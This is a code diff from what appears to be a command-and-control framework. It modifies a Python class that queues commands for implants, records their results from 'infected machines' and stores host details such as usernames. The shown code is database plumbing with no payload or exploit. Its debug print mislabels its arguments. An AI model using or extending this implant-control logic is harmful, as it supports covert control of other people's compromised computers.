@@ -2,9 +2,11 @@ import ast
 
 from Data.Database import Database
 from Implant.ImplantGenerator import ImplantGenerator
+from Listeners.ImplantReponseProcessor import ImplantResponseProcessor
 
 class ImplantSingleton:
     class __OnlyOne:
+        IRP = ImplantResponseProcessor()
         # -- The Implant class is sole class responsible for controlling data to and from implants.
         # --    it manages  these interaction across all types of implants and communication protocols.
 
@@ -14,7 +16,7 @@ class ImplantSingleton:
             db.implant.Register_ImplantCommand(User, UniqueImplantKey, Command, cid=cid)
 
 
-        def IssueCommand(self,UIK=0, c2_protocol=None):
+        def issue_command(self,UIK=0, c2_protocol=None):
             if UIK != 0:
                 # -- Issue command based on unique implant identifiers (UIK)
                 # -- UIK is embedded into the implant via Jinja on delivery.
@@ -45,10 +47,24 @@ class ImplantSingleton:
                 return None, None
 
         # -- Used by Implant - Logs command responses from infected machines.
-        def CommandResponse(self,unique_implant_key , cmd_result, c2_protocol=None):
-            generated_implant_data = db.implant.Get_GeneratedImplantDataFromUIK(unique_implant_key)
-            db.implant.Register_ImplantResponse(generated_implant_data['cid'], unique_implant_key,cmd_result, c2_protocol)
+        def command_response(self, unique_implant_key, command_id, raw_command_result, c2_protocol=None):
+            # -- This is where the command response should be processes
+            print("---Command Response---\ncmmd_id: {}\nimp_key: {}\nc2_prto: {}\n: result: {}\n".format(
+                unique_implant_key,
+                command_id,
+                raw_command_result,
+                c2_protocol
+            ))
+            # IN DEV: Currently this returns the exact data that is submitted.
+            command_result, host_data = self.IRP.process_command_response(command_id, raw_command_result)
 
+            # -- End command response processing.
+            db.implant.Register_ImplantResponse(unique_implant_key, command_id, command_result, c2_protocol)
+            # Once we have updates the command response we will then update the information stored within the
+            # unique implant key data.
+            # This data will show things like username etc.
+            if host_data is not None:
+                db.implant.update_host_data(unique_implant_key, host_data)
 
         # -- Used by webapp.
         def Get_CommandResult(self,cid):
